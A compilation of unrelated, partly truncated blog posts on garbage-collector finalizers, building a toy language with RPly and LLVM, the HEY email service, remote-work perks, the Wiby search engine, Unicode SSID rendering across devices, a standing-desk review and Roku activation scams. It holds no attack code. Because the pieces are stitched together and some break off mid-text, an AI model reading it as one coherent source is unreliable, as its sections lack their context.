objects (which is not required by the GC contract!), you could manage
effectively-inexhaustible resources with finalizers.
Maybe very small C objects.</p>

<p>Conceptually you could use finalizers for statistics and book-keeping,
but in practice they cost too many CPU cycles.</p>

<h2>A hypothetical Resource Collector</h2>

<p>I can imagine a programming language where finalizers are useful.</p>

<p>The language's runtime would, in addition to tracking statistics
about heap use, allow the programmer to specify custom resource
trackers.
An object that registers a finalizer would also tell the runtime
how much pressure the new object applies to a resource.
If the resource is near exhaustion, the runtime collects objects
that are both unreachable in memory and use the particular
resource and collects them.</p>

<p>If you build such a language, I would like to try it.
You could even do it as an extension to an existing language like
Go, though you would have to fork the runtime.</p>

<p>Otherwise, I believe I have one very small use for finalizers as
they exist today, which I will talk about in a followup blog post.</p>

July 3, 2020 | https://joshsharp.com.au/blog/never-been-an-easier-time-to-write-a-language.html | <a href="https://web.archive.org/web/*/https://joshsharp.com.au/blog/never-been-an-easier-time-to-write-a-language.html">archive.org</a>

        <div>

            

            <p>As programming matures and shifts to higher-level abstractions, it becomes more and more about assembling
pre-made building blocks and less about writing new, novel solutions of your own. When I create web apps
(the bread and butter of my day job) I'm using an open-source OS, programming language, database, database
connector library, web server, web framework, authentication libraries, API libraries, payment service libraries...
You get the idea. Increasingly the code I write is "glue" code, simply binding together my building
blocks in the correct order, like a more complicated <a href="https://ifttt.com/">IFTTT</a>, or textual Lego.</p>

<p>It's not surprising that this collection of building blocks is expanding to encompass ever-more-complicated
areas of programming. Today, it's possible to build a simple programming language in the same way you'd
build a web app.</p>


<h3 id="what-s-involved-in-writing-a-language-">What's involved in writing a language?</h3>
<p>The components of a language usually boil down to a "front-end" and a "back-end".</p>
<p>The front-end traditionally consists of a lexer, for turning raw source code into tokens based on grammar
rules, and a parser, for turning tokens into an Abstract Syntax Tree, or AST — nested blocks that represent
operations.</p>
<p>The back-end is the "compiler" which performs steps like type-checking, optimisation, and finally converting
the AST into a lower-level representation. If you're writing an interpreted language, this lower-level is
probably bytecode, rather than an executable, and a corresponding interpreter which reads
and performs bytecode instructions. For example, Python is an interpreted language where <code>.py</code> denotes the raw
source code file, and <code>.pyc</code> the compiled bytecode. When first running a <code>.py</code> file, Python will build a
bytecode-compiled equivalent it can run next time (until your source changes, anyway). If instead you're writing
a compiled language, your back-end builds native executables that can be run directly by the OS.</p>
<p>So once you have a grammar for your syntax, to plug into your front-end, and you can compile the resulting
AST with your back-end, what else is there to do? Well, don't forget about writing a standard library —
defining your built-in types, classes (if you have those), and all of the standard functions to
operate on them. This step is at least as much work.</p>
<h3 id="why-is-it-so-easy-then-">Why is it so easy then?</h3>
<p>If you're writing a language today, many of the parts we defined above already exist for you. Your back-end
and your front-end can both be built out of existing parts.</p>
<p>There are plenty of lexers and parsers available — for example, Lexx and Yacc are a venerable
lexing and parsing combo that have spawned countless modern interpretations. <a href="https://rply.readthedocs.org/">RPly</a>
(RPython Lexx/Yacc) is my current tool of choice in this area. If you use a lexer and parser, the work
left for you is to write your grammar rules, objects representing your AST, and simple functions
telling the parser how to turn grammar into AST. Defining a grammar and an AST are fun! If your syntax
is simple, this step probably won't be that hard either.</p>
<p>For the back-end, <a href="http://llvm.org/">LLVM</a> is the most well-known and respected tool for the job. LLVM powers Clang,
a C and C++ compiler, and other well-known languages like Rust and Swift. The beauty of LLVM is its
Intermediate Representation, or IR. IR looks a lot like assembly language, or really ugly C, but if
you're up for translating your language to LLVM IR, LLVM will take care of optimising and compiling this to a
native executable for you! This is huge. It can even be run in interpreted mode for debugging, or used
as a Just-In-Time (JIT) compiler within your interpreter, if that's your jam.</p>
<p>Fortunately you needn't write IR by hand. Because LLVM has a C interface, there are many LLVM libraries
in many languages to help you create your IR. <a href="http://llvmlite.pydata.org/">Llvm-lite</a> is the most mature Python binding I found,
and what I'm currently using. Essentially, using llvm-lite means you can ask it to create a new function definition for you,
for example, and it'll take care of generating the right IR syntax, and give you back a higher-level interface
for managing variables and code blocks within.</p>
<p>So with this combination of pieces, many of the trickiest parts of writing a language can be wholly outsourced.</p>
<p>Let me give you a concrete example. I'll use my current toy language, written in Python, to demonstrate
how it all goes together:</p>
<ul>
<li>I write a list of tokens (essentially a set of strings) in Python, and feed them to RPly's lexer</li>
<li>I create a Python class to represent each type of AST node or block of code (a function, an if statement, and so on)</li>
<li>I write a set of grammar rules in Python, telling it how to turn tokens into AST instances, and feed them to RPly's parser</li>
<li>I write a compiler class which can turn each AST type into LLVM IR using llvm-lite</li>
</ul>
<p>Then, to compile some source code:</p>
<ul>
<li>The lexer turns my source into tokens</li>
<li>The parser turns tokens into AST</li>
<li>The compiler turns AST into IR, and dumps it to a file</li>
<li>I use the <code>llc</code> tool to compile from IR to an object file</li>
<li>I use <code>gcc</code> to compile that file into an executable</li>
</ul>
<p>Voila, a working program I can run. It can't do much without a standard library, but if I define
the grammar and AST for some "binary operations" like addition and substraction, I can compile
simple arithmetic and return or print the result.</p>
<p>What I'm trying to get at is that once you decide on a grammar for your language, most of the code you
write is glue, turning output from one library into input for another. Of course, this glue code
can get quite complex, but for the modern language developer, so much is already done for you and ready
to plug in. If you have some ideas for a language, it's never been easier to try them out.</p>

<p>After I got my HEY invite during its first week of launch, I started enjoying email again.</p>



<p>I now have a better email workflow using HEY than what I had using Gmail or Spark or even the Apple Mail app.</p>



<p>In this post, I’ll share my HEY workflow and talk about why I chose to pay $99/year for email.</p>



<h2 id="pay-using-data-or-money">Pay using data, or money</h2>



<p>Even before I came across this tweet from DHH, I was already paying for email.</p>



<figure><div>
<blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">The first brand-new product from us at Basecamp in many years is coming this April: An email service (not a client) built for people who both love and hate email. We'll fix the hate, and leave you with the love. Email is amazing, and it deserves our best. <a href="https://t.co/J7OCCTFX2Z">https://t.co/J7OCCTFX2Z</a></p>— DHH (@dhh) <a href="https://twitter.com/dhh/status/1225487645268160512?ref_src=twsrc%5Etfw">February 6, 2020</a></blockquote>
</div></figure>



<p>I had shifted from free email to a paid one on <a href="https://www.fastmail.com/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow">Fastmail</a> back in December 2019.</p>



<p>There we two core reasons behind this decision:</p>



<ul><li><strong>Data privacy. </strong>It was time I stopped tech giants like Google from harvesting my personal and financial data for ads.</li><li><strong>Truly owning my email address.</strong> With a free email on a shared domain, you never truly own your email address. It’s just a rental that might vanish anytime the service provider wishes. Having my email on a custom domain meant I could hold that email address as long as I wished. Also, I could change providers anytime without changing my email address.</li></ul>



<figure><blockquote><p>If you’re not paying for a product, then you are the product.</p></blockquote></figure>



<p>With HEY, the first problem is solved. I’m paying them for their service which leaves out negligible motive for them to mine my data for profit.</p>



<p>And, HEY’s not cheap. It’s $99/year which comes down to $8.25/month. I was paying $5/month on Fastmail.</p>



<p>Apart from the super expensive Superhuman email client, HEY stacks up amongst the top-tier of email providers when it comes to pricing.</p>



<p>However, paying money doesn’t automatically mean they will not snoop on my data. I remember almost paying for <a href="https://otter.ai/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow">Otter</a> and then quickly removing it from my phone when I went through <a href="https://blog.otter.ai/privacy-policy/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow">their privacy policy</a>.</p>



<p>To dig deep, I went over HEY’s privacy policy, and it checked out. No major red flags.</p>



<p>I did say major because there were a couple of quirks including:</p>



<ul><li>Cookies to track user activity.</li><li>Not respecting a Do Not Track request.</li></ul>



<p>However, I can live with that.</p>



<p>But, what about the lecture on truly owning an email address?</p>



<p>It turns out; HEY offers that too.</p>



<p>Although, there is no support for custom domains as of now, they do commit to roll out the feature later this year.</p>



<p>Here’s a reply from DHH on my tweet:</p>



<figure><div>
<blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">No custom domains at launch. But a commitment to do them later this year 🤘</p>— DHH (@dhh) <a href="https://twitter.com/dhh/status/1265687931135524866?ref_src=twsrc%5Etfw">May 27, 2020</a></blockquote>

<p>But, that’s not all. If you pay for at least one year of HEY which is $99, you get to keep your @hey.com email address, forever.</p>



<p>If I cancel my HEY account next year, I would still be able to receive emails on my @hey.com address if I choose to forward all incoming emails to a new address.</p>



<p>It seems pretty reasonable.</p>



<p>We receive a lot of emails, including sensitive ones like password reset and transaction logs on our email address. Being held hostage and asked to pay a ransom of $99/year just to keep the email address would have been unethical.</p>



<p>Although, I don’t want to move away from HEY anytime soon, this option seems like a good backup strategy.</p>



<h2 id="privacy-aside-i-also-love-hey-for-these-features">Privacy aside, I also love HEY for these features</h2>



<p>If HEY offered only privacy, I would have happily stuck to Fastmail. I was getting a good enough privacy-friendly email for half the price when paid yearly.</p>



<p>But, HEY’s more than just a privacy-friendly email.</p>



<p>Let’s start with:</p>



<h3 id="the-screener">The screener</h3>



<p>The screening feature is a game-changer for me.</p>



<p>I used to do all the hard work of making a filtering rule on my Gmail and Fastmail to weed out any unnecessary emails, but HEY makes it so easy.</p>

<p>Filtering out was a second step in my “konmari” inbox process. My first step was to unsubscribe manually or by using a tool like <a href="https://leavemealone.app/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow">LeaveMeAlone</a>.</p>



<p>If I kept getting emails even after unsubscribing, I wrote filtering rules.</p>



<p>HEY screening is the reverse of what I was used to, and it made total sense. I regularly screen-in or screen-out emails and keep my actual email workspace tidy.</p>



<p>Instead of reacting to spammy senders, I am proactively blocking them out of my inbox.</p>



<p>For example, I recently subscribed to the <strong>Dense Discovery</strong> newsletter, and the verification email landed on my screener:</p>

<p>I have seen tweets about why the screener is only helpful for famous people who get tons of emails from unknown senders. I don’t think that’s the case.</p>



<p>This feature has been super helpful for me because I get spammed by a ton of agencies to buy their services.</p>

<p>What’s the worst part?</p>



<p>They usually don’t have unsubscribe links and often send the same email from different addresses.</p>



<p>Even the filters won’t permanently block these senders from reaching my inbox and cluttering it up.</p>



<p>With HEY, they never get past the screening list. If I ever change my mind about a sender, I can always screen them back in on the <a aria-label="undefined (opens in a new tab)" href="https://app.hey.com/my/clearances" target="_blank" rel="noreferrer noopener nofollow">Screener History page</a>.</p>



<p>For some people, screening might seem like a lot of work. For me, it’s an organising feature I love.</p>



<p>Talking about newsletters:</p>



<h3 id="the-feed-page-is-a-delight">The feed page is a delight</h3>



<p>HEY’s <a aria-label="undefined (opens in a new tab)" href="https://app.hey.com/feedbox" target="_blank" rel="noreferrer noopener nofollow">feed page</a> is how newsletters should be read.</p>



<p>We are already used to reading posts on social media in a linear feed. </p>



<p>Why not have the same approach for newsletters? They’re mostly like social media posts.</p>

<p>I usually visit this page 2-3 times a day and scan through the newsletters I receive.</p>



<p>Unlike Gmail or Spark, HEY doesn’t have a machine learning system to automatically sort emails into their respective folders.</p>



<p>Frankly, I would have enjoyed an automatic sorting process, but the manual sorting works for me as well. Maybe because I’m a neat-freak but well, what works, works.</p>



<p>To make sure newsletters land on the Feed page, you need to mark the sender’s delivery options on the sender’s contact page:</p>

<p>The same can also be <a aria-label="undefined (opens in a new tab)" href="https://youtu.be/UCeYTysLyGI?t=913" target="_blank" rel="noreferrer noopener nofollow">done on the screening page</a>. I usually sort emails on my screening page. It’s easier.</p>



<p>Another source of frequent emails which I don’t need to see right now are transaction logs.</p>



<p>With HEY:</p>



<h3 id="paper-trail-has-got-me-covered">Paper trail has got me covered</h3>



<p>For me, and I’m sure for a lot of you, transaction receipts are good for referring later on.</p>



<p>I don’t need to see them on my inbox. Neither do I need to read them right now.</p>



<p>The <a href="https://app.hey.com/paper_trail" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow">paper trail page</a> in HEY does precisely that.</p>

<p>Marking a sender to deliver to paper trail (the same way we marked newsletters for feed), delivers all emails from them to a separate section out of my Imbox.</p>



<p>How is this any different from what Gmail does?</p>



<p>I don’t have to mark the emails as read. They are already in a read state.</p>



<p>I usually open this page up to verify a recent transaction.</p>



<p>Talking about transaction receipts:</p>



<h3 id="hey-has-a-central-place-for-attachments">HEY has a central place for attachments</h3>



<p>How this helps is I can view all attachments from a sender and filter by file type in a single page.</p>

<p>It’s useful in situations where you don’t precisely remember the particular email an attachment was on but know the who sent it to you.</p>



<p>I have had several such moments in the past. Probably that’s why this feature is so important to me.</p>



<p>Apart from these prominent features:</p>



<h3 id="i-like-how-i-can-reply-later-or-keep-aside-my-emails">I like how I can reply later or keep aside my emails</h3>



<p>Keep aside and reply later are those tiny features which fit into my workflow without disrupting it.</p>



<p>On my regular inbox with Gmail and Spark, I used to keep emails in my inbox, which I needed to refer or maybe reply to in some time.</p>



<p>This approach ensured I didn’t miss out on stuff that I need to get back to in the near future.</p>



<p>With HEY’s keep aside and reply later functionality, the organisation became a little easier and cleaner.</p>



<p>It’s what we software engineers call “separation of concerns”.</p>

Reply later, and 2. Keep aside</figcaption></figure></div>



<p>Some use cases where these features fit in:</p>



<ul><li><strong>Reply later: </strong>This is helpful when I know I need to get back with a response to an email, but now is not the correct time. I stash the email away to reply later and then reply when I have time.</li><li><strong>Keep aside</strong>: I find this useful for cases like waiting for a settlement to process or maybe some purchase that for which I’ll get a final confirmation a few days later.</li></ul>



<p>Also, there were times where I moved an email from keep aside to reply later when I didn’t hear back from the sender in a few days.</p>



<p>In a sense, both features go hand in hand to make your email processing easier.</p>



<p>It feels good not to have to apply hacks to get something done.</p>



<p>As <a aria-label="undefined (opens in a new tab)" href="https://twitter.com/jasonfried" target="_blank" rel="noreferrer noopener nofollow">Jason Fried</a> likes to say:</p>



<figure><blockquote><p>HEY is all about workflows, not workarounds.</p></blockquote></figure>



<p>Aside from all these great features, HEY is not a total joyride. It has its share of quirks.</p>



<h2 id="there's-room-for-improvement">There’s room for improvement</h2>



<p>HEY is still at a very early stage. Therefore, it’s safe to say that there will be a lot of iterations in the future, which will make the product even better.</p>



<p>As of now, here are the things about HEY that I don’t wholly enjoy:</p>



<h3 id="the-ui">The UI</h3>



<p>When I first saw HEY, I was convinced that I’d ditch it after a few days of use.</p>



<p>I’m more of a clean and sharp design kind of guy. HEY was playful and bold.</p>



<p>I was wrong.</p>



<p>After using HEY for about two days, the UI grew on me. The boldness and fun aspect of the UI made me excited about email once again.</p>



<p>I can’t remember when I was as excited to email someone as I am right now. Email is fun again.</p>



<p>There are still some parts of the UI that I haven’t been able to accept. One of them is the dark mode.</p>



<p>Take this email, for example:</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    <p>Perks and benefits are a huge part of hiring and retaining top talent and keeping people happy. They are not only a set of goodies and benefits to keep your people happy but a substantial part of the employment package. For remote companies, the perk packages often look a little bit different and may include things that aren't usual in any other company.</p>
<h2>Perks and Benefits in co-located companies</h2>
<p>Depending on where you live, companies tend to offer free drinks, snacks and fruits to their employees. They usually have a set of PTO days – depending on the country between 10 to 30 – and pre-defined parental leaves. Talking about time off, many companies also offer sabbatical offerings. Basecamp, for example, offers <a href="https://basecamp.com/about/jobs">a full month off after every three years</a> of employment.</p>
<p>Many other offerings do not involve paid time off and consist of a pre-defined period you can take off unpaid if you so wish. Most companies also offer pension packages, some offer paid health/sports perks, sometimes even education stipends and paid conference visits too.</p>
<p>If you work at a bigger company or in one of the tech hubs, such as San Francisco or New York, for example, it's not uncommon to see companies offer free catered lunches as well. Google is notorious for offering over-the-top perks, anything from on-site gyms to hairstylists.</p>
<h2>Recommended Benefits for Remote Employees</h2>
<p>Remote employees have other requirements for a good perk system. They don't need catered lunches, because they can cook or order whatever they want. They don't need an on-site hairstylist, because they can go to their local one, and having flexible time as a perk doesn't make sense if you can plan your day by yourself.</p>
<p>Thinking of it, having a good remote-first working structure is already a great perk, but there is more that should be part of a remote work package.</p>
<h3>Coworking Stipend</h3>
<p><a href="https://nohq.co/blog/mental-health-hacks-for-your-remote-team/">Remote work can be lonely</a>, and a welcome change to the home office may be the casual trip to a local co-working space. If applicable, employers should try to get all of their employees a hot-seat card for a local coworking space (meaning they can visit and grab a seat so-and-so many times per month, not a fixed desk). This can be crucial if an employee is otherwise mostly isolated (e.g. in a very different timezone). At times, a fixed full-month seat may need to be supplied.</p>
<h3>Locally adjusted healthcare benefits</h3>
<p>Health insurance is different in every country. While US employers tend to offer extensive healthcare benefits, it can be unusual or even useless in many other countries (e.g. if healthcare is mostly free). Adjust for local differences, possibly offer an annual health stipend if applicable.</p>
<h3><strong>Equipment for home office</strong></h3>
<p>If you expect people to work from home (or anywhere), you should supply anything you'd supply for a co-located employee. Meaning (if needed) a great table, chair, screen, computer, any accessories needed, as well as internet access (at least subsidized). This may differ from employee to employee, as people tend to have a small existing home office at times. It can be good to offer a hardware stipend upfront (usually between $2,000 and $3,000) to cover all expenses of a home office.</p>
<h3><strong>Education stipend</strong></h3>
<p>A big downside of working remotely? <a href="https://nohq.co/blog/casual-conversation-in-remote-teams/">No casual chats with your coworkers</a> to learn something new, no easy knowledge exchange over multiple days, rarely a full-company talk or workshop. Learning new things get harder, the less connected you are. A stipend for educational material makes it easy for your employees to grow and learn.</p>
<p>Supplying topical books, courses, subscriptions and similar is also in your interest. It doesn't only help people to grow, but also bring new ideas into your business.</p>
<h3><strong>Company-wide team retreats</strong></h3>
<p>The sweet thing about not having an office, or renting something small, is saving a lot of money on rent. The best way to re-invest that money is by <a href="https://zapier.com/learn/remote-work/how-run-company-retreat-remote-team/">flying the whole team out for a retreat</a>, either to an existing HQ or a remote location, for 1-2 weeks of team building, strategy planning, brainstorming, innovation and exchange. This can get costly, but is crucial to do! Face-to-face time can't get substituted with anything, you'll be left with a tighter, happier and greater team.</p>
<p>Optionally, fly out smaller groups or teams to get them together and have in-person sessions to plan the future and do team-building, it will work wonders for your team culture!</p>
<h2>How to pay or reimburse perks</h2>
<p>Many of these perks wouldn't be called 'perks' in the traditional sense, because of a simple reason: They just mean more money in your employee's hands. Unless you are working with a <a href="https://nohq.co/tools/deel/">benefits partner</a>, these perks consist of things that folks can get reimbursed.</p>
<p>Be it books, as part of the education stipend, or healthcare benefits. It would be too much work to pay people's bills, worry about local regulation or taxes – the easiest way is to just reimburse your employees (or contractors).</p>
<p>Perks don't have to be readily available snacks or catered lunches – paying for education or reimbursing healthcare costs is just as much a perk. As a remote company, you're already offering a great perk with people being able to work independently. Taking off some load and reimbursing annoying, recurring costs is just the cherry on top!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Search engines like Google have become indispensable, able to find answers to all of your technical questions; but along the way, the fun of web surfing was lost.
</p><p>
In the early days of the web, pages were made primarily by hobbyists, academics, and computer savvy people about subjects they were personally interested in. Later on, the web became saturated with commercial pages that overcrowded everything else. All the personalized websites are hidden among a pile of commercial pages. Google isn't great at finding them, its focus is on finding answers to technical questions, and it works well; but finding things you didn't know you wanted to know, which was the real joy of web surfing, no longer happens. In addition, many pages today are created using bloated scripts that add slick cosmetic features in order to mask the lack of content available on them. Those pages contribute to the blandness of today's web.
</p><p>
The Wiby search engine is building a web of pages as it was in the earlier days of the internet. In addition, Wiby helps vintage computers to continue browsing the web, as pages indexed are more suitable for their performance.</p><p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>   <p>This is a continuation of my previous post <a href="https://hamptonmoore.com/posts/weird-wifi-name-display/">Comparing how different devices display the SSID “á̶̛̛̓̿̈͐͆̐̇̒̑̈́͘͝aaa”</a>. After posting it on HackerNews I got lots of feedback. The key one was something that I had sadly missed when I originally started this project. When the WiFi name of “á̶̛̛̓̿̈͐͆̐̇̒̑̈́͘͝aaa” got shortened down to a one byte before the second “a” due to the 32 byte/octet limit of SSIDs. The issue was this character is actually two bytes wide, so the first part of the character stayed, with the second byte of it missing. The character in question was ◌̈́, with the hex codepoint cd84. Looking at the raw hex of the SSID you can see it ends in cd, <code>61ccb6cc81cc93ccbfcc88cc9bcc9bcd90cd98cd86cc90cd9dcc87cc92cc91cd</code>. For those curious about how that would be rendered on your device here it is “á̶̛̛̓̿̈͐͆̐̇̒̑͘͝�”. After realizing this I decided my previous comparisons of how devices reacted to my weird unicode SSID was unfair. The SSID this time is “á̶̛̛̓̿̈͐͆̐̇̒̑͘͝a” which is almost the exact same but that last two byte long character was replaced with an “a”. This was to keep the SSID at 32 octets long. Looking at the new hex of the SSID <code>61ccb6cc81cc93ccbfcc88cc9bcc9bcd90cd98cd86cc90cd9dcc87cc92cc9161</code> you can see that is is identical baring the <code>61</code> instead of a <code>cd</code> at the end.</p> <p>Below are the previous photos of the previous SSID “á̶̛̛̓̿̈͐͆̐̇̒̑͘͝�” with the new SSID “á̶̛̛̓̿̈͐͆̐̇̒̑͘͝a” under it. They are also grouped the same as previously to keep continuity.</p> <p>Galaxy S8 running Android 9 with Kernel 4.4.153 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/android.jpg" alt=""></p> <p><img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/d2/android.jpg" alt=""></p> <p>Amazon Firestick <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/firestick.jpg" alt=""></p> <p><img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/d2/firestick.jpg" alt=""></p> <p>As before the Galaxy S8 and the Firestick both handled it perfectly with there being no issues with how it rendered besides vertical cutoff which makes sense.</p> <p>iPhone running iOS 13.5.1 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/iphone-ios1351.jpg" alt=""> <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/d2/iphone-ios1351.jpg" alt=""></p> <p>Apple TV Second Generation <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/appletvgen2.jpg" alt=""> <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/d2/appletvgen2.jpg" alt=""></p> <p>These results were interesting. It showed that if the UTF-8 character in an SSID is invalid then IOS falls back to the <a href="https://en.wikipedia.org/wiki/Mac_OS_Roman">Mac OS Roman</a> character set, but since the new SSID is valid UTF-8 iOS properly renderers the SSID.</p> <p>2012 Macbook running High Sierra 10.13.6 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/d2/macos.jpg" alt=""></p> <p>Unlike last time the Macbook actually showed the network. I believe last time instead of falling back to Mac OS Roman like iOS the Macbook just treated the SSID as spam or noise and dropped it</p> <p>Windows 10 Pro 10.0.19041 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/windows10.png" alt=""></p> <p><img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/d2/windows10.jpg" alt=""></p> <p>Windows was able to properly handle this SSID as opposed to falling back to <a href="https://en.wikipedia.org/wiki/Windows-1252">Windows-1252</a> like it did previously.</p> <p>Chromebook running ChromeOS 83.0.4103.97 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/chromeos.jpg" alt=""></p> <p><img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/d2/chromeos.jpg" alt=""></p> <p>Unlike last time the Chromebook was able to render this perfectly with no question marks.</p> <p>Kindle Paperwhite running Firmware 5.10.2 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/kindlepaperwhite.jpg" alt=""></p> <p><img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/d2/kindlepaperwhite.jpg?" alt=""></p> <p>Vizio M55-C2 TV <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/viziom55-c2.jpg" alt=""> <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/d2/viziom55-c2.jpg" alt=""></p> <p>Unlike last time the kindle was able to show the SSID without escape any of the characters. Sadly the Vizio was not able to show the SSID and just fell back to escaped hex.</p> <p>The results from changing the SSID showed a couple things, namely devices really do not like it when they are given invalid or incomplete UTF-8 codes and lots of devices handle UTF-8 text much better than I thought they would. It also showed that some devices fallback to their native 8 bit encoding formats when they see an invalid UTF-8 codepoint, there is probably some room for exploitation here like inserting escape keys. I originally was not expecting the kindle to work at all, nor the chromebook after seeing the slew of question marks originally. Android was also found to be at handling text with invalid UTF-8 characters it just removed them as opposed to switching up formatting, falling back to hex, or erroring out with all question marks.</p> <p>Thank you to everyone who provided valuable feedback on the previous post. I have more research I plan ond doing with this in the future.</p> <p>Lastly if anyone would like to run this test themselves and send me the comparison results to be added my email is <code>me (at) hampton (This key &gt; not shifted) pw</code>.</p> <hr> <p> Hello reader. I do not normally like to put advertisements or promotions on my website, but recently a good friend of my Jaden Ann Scrivener died in a car crash. She was known in the community as the most caring and energetic person around. She was a beam of sunshine and happiness brightening up the day of anyone who interacted with her. If you could <a href="https://www.aplos.com/aws/give/RayofHopeMedicalMissionsInc/Jaden">please donate to her memorial fund</a>. All the proceeds will go to the <a href="https://www.rohmm.org/">Ray of Hope Medical Missions</a> which facilitates life-changing surgeries, reduces infant mortality, and provides mission opportunities locally. </p> </article></div>]]>

<div>
<p>I’ve been using a <a href="https://timleland.com/ergo-depot-jarvis-standing-desks-review/">standing desk</a> for over 5 years now and really enjoy being able to sit and stand throughout the day. There are many health benefits of a standing desk that I will not cover in this post, but I will say being able to stand and work has helped me stay healthy while working at a desk for extended periods of time.</p>
<p>Since working from home, I’ve needed more desk space for additional monitors. My <a href="https://timleland.com/ergo-depot-jarvis-standing-desks-review/">previous standing desk</a> was only 4 ft long and my <a href="https://timleland.com/dell-34-ultra-wide-monitor-review-u3417w/">34″ monitor</a> spanned almost the entire desk. <a href="https://www.autonomous.ai/?utm_source=Press&amp;utm_medium=Timleland_press&amp;utm_campaign=No&amp;utm_content=No">Autonomous</a> was kind enough to send me a desk to review.<span id="more-10251"></span></p>
<p><a href="https://www.autonomous.ai/?utm_source=Press&amp;utm_medium=Timleland_press&amp;utm_campaign=No&amp;utm_content=No">Autonomous</a> is a well-known company that has been around since 2015 focusing on the “smart office” primarily <a href="https://www.autonomous.ai/office-chairs">office chairs</a> and <a href="https://www.autonomous.ai/standing-desks?rid=865884&amp;utm_campaign=referrals&amp;utm_source=referrals_copy&amp;utm_medium=865884&amp;utm_term=referrals_share">standing desk</a>.&nbsp;From my research, they make the <a href="https://www.autonomous.ai/smart-officee?utm_source=Press&amp;utm_medium=Timleland_press&amp;utm_campaign=No&amp;utm_content=No">most affordable standing desk</a> on the market starting at $379. That is about half of what I paid for a similar desk 5 years ago. I decided to go with the <a href="https://www.autonomous.ai/standing-desks/smartdesk-2-home?utm_source=Press&amp;utm_medium=Timleland_press&amp;utm_campaign=No&amp;utm_content=No">SmartDesk 2 Premium</a> XL with black legs and a walnut top which cost around $569. The XL is 70″ long which is perfect if you need more space for additional monitors. They also sell an <a href="https://www.autonomous.ai/standing-desks/l-shaped-smartdesk?rid=865884&amp;utm_campaign=referrals&amp;utm_source=referrals_copy&amp;utm_medium=865884&amp;utm_term=referrals_share">L shaped desk</a> for $739 which is another great option if you have space for it. Other companies sell L shaped desk for double that price. It pretty amazing how they are able to sell the best affordable standing desk at these prices.</p>
<p>The XL top comes with 2 grommets that are great for cable management. I recommend using a <a href="https://www.autonomous.ai/office-accessories/cable-tray?rid=865884&amp;utm_campaign=referrals&amp;utm_source=referrals_copy&amp;utm_medium=865884&amp;utm_term=referrals_share">cable tray</a> or zip ties to keep your cables neat under the desk.</p>
<h3>Pros</h3>
<ul>
<li>Affordable adjustable standing desk</li>
<li>Customizable options</li>
<li>Quality materials</li>
<li>Easy to assemble</li>
<li>Programmable height</li>
</ul>
<h3>Cons</h3>
<ul>
<li>Included Allen wrench did not work well</li>
<li>Wish the <a href="https://www.autonomous.ai/office-accessories/cable-tray?rid=865884&amp;utm_campaign=referrals&amp;utm_source=referrals_copy&amp;utm_medium=865884&amp;utm_term=referrals_share">Cable Tray</a> was included</li>
</ul>
<p>Overall I am extremely happy with <a href="https://www.autonomous.ai/standing-desks/smartdesk-2-business?rid=865884&amp;utm_campaign=referrals&amp;utm_source=referrals_copy&amp;utm_medium=865884&amp;utm_term=referrals_share">SmartDesk 2 Premium</a> from Autonomous. I give it a 5 out of 5 compared to the other standing desk I have used. They make great products at affordable prices. If you have been considering a standing desk or office chair you cannot go wrong with <a href="https://www.autonomous.ai/?rid=865884&amp;utm_campaign=referrals&amp;utm_source=referrals_copy&amp;utm_medium=865884&amp;utm_term=referrals_share">Autonomous</a>.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
<p>New Roku and other streaming device users beware. These scammers are running a large network of lookalike websites tricking into paying “activation” or “set-up” fees for something coming free of charges.</p>
<p>How do these scams work? What Roku scam websites belong to the same circle of scammers? Read on to find out.</p>

<h2 id="how-the-scam-works">How the scam works</h2>
<p>The spiel is that if someone is trying to activate a streaming device and Googles <em>“Roku activation”</em>, paid ads would pop up within the search results all leading to the scammy sites.</p>
<div><blockquote><p lang="en" dir="ltr">Top 4 results on Google (in a private window with uBlock Origin disabled) are all fake sites which lead to 800 numbers to scammers. <a rel="nofollow noopener noreferrer" target="_blank" href="https://twitter.com/RokuSupport?ref_src=twsrc%5Etfw">@RokuSupport</a> needs to step in here and take these down. <a rel="nofollow noopener noreferrer" target="_blank" href="https://t.co/yzSoEzHfhx">pic.twitter.com/yzSoEzHfhx</a></p>— Michael | Unstable World (@esposimi) <a rel="nofollow noopener noreferrer" target="_blank" href="https://twitter.com/esposimi/status/1262432472794574855?ref_src=twsrc%5Etfw">May 18, 2020</a></blockquote>

</div>
<p>The <a rel="nofollow noopener noreferrer" target="_blank" href="https://www.wave3.com/2020/05/15/bbb-warns-about-roku-activation-scam/">victims are then asked to pay</a> a one-off activation fee and/or a substantial charge for tech support services not required in the first place. Needless to say, these lookalike websites are not related to Roku in any capacity. <a rel="nofollow noopener noreferrer" target="_blank" href="https://support.roku.com/article/208757068">Roku device activation</a> at <em>roku.com/link</em> and general tech support from Roku is free of charge.</p>

</div>
